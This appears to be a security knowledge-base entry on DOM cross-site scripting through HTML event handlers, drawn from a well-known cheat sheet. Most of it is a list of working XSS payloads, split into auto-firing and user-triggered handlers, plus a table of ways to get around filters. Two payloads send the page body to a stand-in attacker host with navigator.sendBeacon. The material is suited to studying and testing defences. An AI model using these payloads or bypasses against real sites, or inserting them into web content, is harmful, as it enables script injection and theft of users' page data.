---
title: DOM XSS — Event Handler Matrix
slug: event-handler-matrix
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/event-handler-matrix]
inbound: []
---

# DOM XSS — Event Handler Matrix

## Pattern

Event handler attributes (`onX=...`) on HTML elements execute JavaScript when their triggering condition fires. When attacker-controlled data can land in an event handler value, or when an injection context allows inserting new tags with event handlers, XSS executes without needing `<script>` tags. The cheat sheet divides handlers into two classes: those that fire without any user gesture ("no interaction required") and those that need a click, hover, keypress, or touch.

## Preconditions

- Injection context lands inside or adjacent to an HTML tag where new attributes or child elements can be injected, OR
- Injection reaches innerHTML / outerHTML / document.write where a full tag can be inserted.
- Blocklists that strip `<script>` but allow arbitrary attributes are the primary scenario.

## Detection

Static signals (js_analyzer / grep):
- Sink: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `$(…).html()`
- Look for reflection points where input appears inside a tag attribute value (already-opened `<tag ...=` context).
- WAF/filter checks: `<script` blocked → pivot to event handler delivery.

## Triggering

### No-user-interaction event handlers (auto-fire)

```html
<!-- CSS animation cancel -->
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>

<!-- CSS animation end -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

<!-- CSS animation start -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>

<!-- CSS animation iteration -->
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>

<!-- Hidden-until-found reveal -->
<xss id=x onbeforematch=alert(1) hidden=until-found>

<!-- Before print -->
<body onbeforeprint=console.log(1)>

<!-- Before unload (data exfil) -->
<body onbeforeunload=navigator.sendBeacon('//evil.example/',document.body.innerHTML)>

<!-- SVG animate begin -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- SVG animate end -->
<svg><animate onend=alert(1) attributeName=x dur=1s>

<!-- Audio/video canplay -->
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>

<!-- content-visibility auto (all tags) -->
<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>

<!-- content-visibility hidden input -->
<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>

<!-- Duration change -->
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>

<!-- Audio ended -->
<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

<!-- onerror (resource load fail) -->
<audio src/onerror=alert(1)>

<!-- onfocus autofocus (no click needed) -->
<xss onfocus=alert(1) autofocus tabindex=1>

<!-- Hash change -->
<body onhashchange="print()">

<!-- Body load -->
<body onload=alert(1)>

<!-- Audio loadeddata -->
<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

<!-- postMessage -->
<body onmessage=print()>

<!-- Page reveal / show -->
<body onpagereveal=alert(1)>
<body onpageshow=alert(1)>

<!-- Audio play -->
<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

<!-- popstate -->
<body onpopstate=print()>

<!-- SVG animation repeat -->
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />

<!-- Resize -->
<body onresize="print()">

<!-- Scroll -->
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>

<!-- scrollend -->
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px"><div style=width:1000px>scroll right</div></xss>

<!-- scrollsnapchange -->
<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:start></div></address>

<!-- CSP violation (site-specific) -->
<xss onsecuritypolicyviolation=alert(1)>XSS</xss>

<!-- Shadow DOM slot change -->
x<template shadowrootmode=open><slot onslotchange=alert(1)>

<!-- Audio suspend -->
<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>

<!-- details toggle -->
<details ontoggle=alert(1) open>test</details>

<!-- CSS transition cancel -->
<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>

<!-- CSS transition end -->
<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>

<!-- CSS transition run -->
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=alert(1)></xss>

<!-- CSS transition start -->
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>

<!-- Unhandled promise rejection -->
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>

<!-- Unload (data exfil) -->
<body onunload=navigator.sendBeacon('//evil.example/',document.body.innerHTML)>

<!-- Validation state change -->
<geolocation onvalidationstatuschange=alert(1)>

<!-- Audio waiting (loop) -->
<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>

<!-- WebKit animation variants -->
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>

<!-- AirPlay target availability -->
<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>

<!-- WebKit transition end -->
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss>
```

### User-interaction-required event handlers (selected)

```html
<!-- Click -->
<xss onclick="alert(1)" style=display:block>test</xss>

<!-- Mouseover -->
<xss onmouseover="alert(1)" style=display:block>test</xss>

<!-- Keydown -->
<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>

<!-- Focus (tab to element) -->
<a id=x tabindex=1 onfocus=alert(1)></a>

<!-- Copy -->
<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test

<!-- Paste -->
<a onpaste="alert(1)" contenteditable>test</a>

<!-- Drag -->
<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>

<!-- Form submit -->
<form onsubmit=alert(1)><input type=submit>

<!-- Change -->
<input onchange=alert(1) value=xss>

<!-- Input -->
<input oninput=alert(1) value=xss>

<!-- Wheel -->
<body onwheel=alert(1)>

<!-- Scroll (user-triggered) -->
<xss onscrollend=alert(1) style="display:block;overflow:auto;width:100px;height:100px"><div style=width:1000px>scroll</div></xss>

<!-- Touch (mobile) -->
<body ontouchstart=alert(1)>
<body ontouchmove=alert(1)>
<body ontouchend=alert(1)>

<!-- popover toggle (click) -->
<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>

<!-- command (click) -->
<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
```

## Bypasses

| Defense | Bypass |
|---|---|
| Strip `on*=` | Use HTML entities: `onclick&#x3d;alert(1)` (context-dependent) |
| Block `alert` | Use `print()`, `confirm()`, `console.log(1)`, `navigator.sendBeacon(…)` |
| Block `(` `)` | Use template literals: `alert\`1\`` |
| Allowlist-only tags | Use `<xss>`, `<custom-element>`, or lesser-known allowed tags |
| Strip `autofocus` | Target `onscroll`, `onresize`, `onload` body events instead |
| Require user gesture | `onfocus`+`autofocus`, `oncontentvisibilityautostatechange`, CSS animation events |
| Block `<body` | SVG/audio/video events: `onloadeddata`, `onanimationend`, `onbegin` |
| Remove `<style>` | Use inline `style=animation-name:x` referencing already-present `@keyframes` |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed.)
